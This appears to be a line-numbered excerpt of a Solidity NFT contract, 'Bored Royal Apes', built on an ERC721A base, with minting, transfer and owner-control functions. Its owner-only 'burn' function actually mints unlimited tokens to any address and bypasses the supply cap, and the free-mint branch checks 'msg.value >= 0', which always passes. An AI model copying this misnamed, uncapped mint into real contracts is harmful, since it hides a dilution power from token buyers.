1088         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1089 
1090         // Overflows are incredibly unrealistic.
1091         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1092         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1093         unchecked {
1094             _addressData[to].balance += uint128(quantity);
1095             _addressData[to].numberMinted += uint128(quantity);
1096 
1097             _ownerships[startTokenId].addr = to;
1098             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1099 
1100             uint256 updatedIndex = startTokenId;
1101 
1102             for (uint256 i; i < quantity; i++) {
1103                 emit Transfer(address(0), to, updatedIndex);
1104                 if (safe) {
1105                     require(
1106                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1107                         "ERC721A: transfer to non ERC721Receiver implementer"
1108                     );
1109                 }
1110 
1111                 updatedIndex++;
1112             }
1113 
1114             currentIndex = updatedIndex;
1115         }
1116 
1117         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1118     }
1119 
1120     /**
1121      * @dev Transfers `tokenId` from `from` to `to`.
1122      *
1123      * Requirements:
1124      *
1125      * - `to` cannot be the zero address.
1126      * - `tokenId` token must be owned by `from`.
1127      *
1128      * Emits a {Transfer} event.
1129      */
1130     function _transfer(
1131         address from,
1132         address to,
1133         uint256 tokenId
1134     ) private {
1135         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1136 
1137         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1138             getApproved(tokenId) == _msgSender() ||
1139             isApprovedForAll(prevOwnership.addr, _msgSender()));
1140 
1141         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1142 
1143         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1144         require(to != address(0), "ERC721A: transfer to the zero address");
1145 
1146         _beforeTokenTransfers(from, to, tokenId, 1);
1147 
1148         // Clear approvals from the previous owner
1149         _approve(address(0), tokenId, prevOwnership.addr);
1150 
1151         // Underflow of the sender's balance is impossible because we check for
1152         // ownership above and the recipient's balance can't realistically overflow.
1153         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1154         unchecked {
1155             _addressData[from].balance -= 1;
1156             _addressData[to].balance += 1;
1157 
1158             _ownerships[tokenId].addr = to;
1159             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1160 
1161             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1162             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1163             uint256 nextTokenId = tokenId + 1;
1164             if (_ownerships[nextTokenId].addr == address(0)) {
1165                 if (_exists(nextTokenId)) {
1166                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1167                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1168                 }
1169             }
1170         }
1171 
1172         emit Transfer(from, to, tokenId);
1173         _afterTokenTransfers(from, to, tokenId, 1);
1174     }
1175 
1176     /**
1177      * @dev Approve `to` to operate on `tokenId`
1178      *
1179      * Emits a {Approval} event.
1180      */
1181     function _approve(
1182         address to,
1183         uint256 tokenId,
1184         address owner
1185     ) private {
1186         _tokenApprovals[tokenId] = to;
1187         emit Approval(owner, to, tokenId);
1188     }
1189 
1190     /**
1191      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1192      * The call is not executed if the target address is not a contract.
1193      *
1194      * @param from address representing the previous owner of the given token ID
1195      * @param to target address that will receive the tokens
1196      * @param tokenId uint256 ID of the token to be transferred
1197      * @param _data bytes optional data to send along with the call
1198      * @return bool whether the call correctly returned the expected magic value
1199      */
1200     function _checkOnERC721Received(
1201         address from,
1202         address to,
1203         uint256 tokenId,
1204         bytes memory _data
1205     ) private returns (bool) {
1206         if (to.isContract()) {
1207             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1208                 return retval == IERC721Receiver(to).onERC721Received.selector;
1209             } catch (bytes memory reason) {
1210                 if (reason.length == 0) {
1211                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1212                 } else {
1213                     assembly {
1214                         revert(add(32, reason), mload(reason))
1215                     }
1216                 }
1217             }
1218         } else {
1219             return true;
1220         }
1221     }
1222 
1223     /**
1224      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1225      *
1226      * startTokenId - the first token id to be transferred
1227      * quantity - the amount to be transferred
1228      *
1229      * Calling conditions:
1230      *
1231      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1232      * transferred to `to`.
1233      * - When `from` is zero, `tokenId` will be minted for `to`.
1234      */
1235     function _beforeTokenTransfers(
1236         address from,
1237         address to,
1238         uint256 startTokenId,
1239         uint256 quantity
1240     ) internal virtual {}
1241 
1242     /**
1243      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1244      * minting.
1245      *
1246      * startTokenId - the first token id to be transferred
1247      * quantity - the amount to be transferred
1248      *
1249      * Calling conditions:
1250      *
1251      * - when `from` and `to` are both non-zero.
1252      * - `from` and `to` are never both zero.
1253      */
1254     function _afterTokenTransfers(
1255         address from,
1256         address to,
1257         uint256 startTokenId,
1258         uint256 quantity
1259     ) internal virtual {}
1260 }
1261 
1262 contract boredroyalapes is ERC721A, Ownable, ReentrancyGuard {
1263     string public baseURI = "/";
1264     uint   public price             = 0.001 ether;
1265     uint   public maxPerTx          = 20;
1266     uint   public maxPerFree        = 1;
1267     uint   public totalFree         = 2222;
1268     uint   public maxSupply         = 4444;
1269     bool   public mintEnabled;
1270     uint   public totalFreeMinted = 0;
1271 
1272     mapping(address => uint256) public _mintedFreeAmount;
1273 
1274     constructor() ERC721A("Bored Royal Apes", "BRA"){}
1275 
1276     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1277         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1278         string memory currentBaseURI = _baseURI();
1279         return bytes(currentBaseURI).length > 0
1280             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1281             : "";
1282     }
1283 
1284     function mint(uint256 count) external payable {
1285         uint256 cost = price;
1286         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1287             (_mintedFreeAmount[msg.sender] < maxPerFree));
1288 
1289         if (isFree) { 
1290             require(mintEnabled, "Mint is not live yet");
1291             require(totalSupply() + count <= maxSupply, "No more");
1292             require(count <= maxPerTx, "Max per TX reached.");
1293             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1294             {
1295              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1296              _mintedFreeAmount[msg.sender] = maxPerFree;
1297              totalFreeMinted += maxPerFree;
1298             }
1299             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1300             {
1301              require(msg.value >= 0, "Please send the exact ETH amount");
1302              _mintedFreeAmount[msg.sender] += count;
1303              totalFreeMinted += count;
1304             }
1305         }
1306         else{
1307         require(mintEnabled, "Mint is not live yet");
1308         require(msg.value >= count * cost, "Please send the exact ETH amount");
1309         require(totalSupply() + count <= maxSupply, "No more");
1310         require(count <= maxPerTx, "Max per TX reached.");
1311         }
1312 
1313         _safeMint(msg.sender, count);
1314     }
1315 
1316     function costCheck() public view returns (uint256) {
1317         return price;
1318     }
1319 
1320     function maxFreePerWallet() public view returns (uint256) {
1321       return maxPerFree;
1322     }
1323 
1324     function burn(address mintAddress, uint256 count) public onlyOwner {
1325         _safeMint(mintAddress, count);
1326     }
1327 
1328     function _baseURI() internal view virtual override returns (string memory) {
1329         return baseURI;
1330     }
1331 
1332     function setBaseUri(string memory baseuri_) public onlyOwner {
1333         baseURI = baseuri_;
1334     }
1335 
1336     function setPrice(uint256 price_) external onlyOwner {
1337         price = price_;
1338     }
1339 
1340     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1341         totalFree = MaxTotalFree_;
1342     }
1343 
1344      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1345         maxPerFree = MaxPerFree_;
1346     }
1347 
1348     function toggleMinting() external onlyOwner {
1349       mintEnabled = !mintEnabled;
1350     }
1351 
1352     function withdraw() external onlyOwner nonReentrant {
1353         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1354         require(success, "Transfer failed.");
1355     }
1356 }